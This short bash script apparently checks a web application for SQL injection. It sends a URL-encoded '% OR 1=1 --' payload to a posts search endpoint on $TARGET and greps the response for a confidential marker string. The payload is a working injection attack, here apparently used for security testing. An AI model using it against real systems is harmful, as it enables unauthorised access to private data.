#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -fsS "$TARGET/api/posts/search?q=%25%27%20OR%201%3D1%20--" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
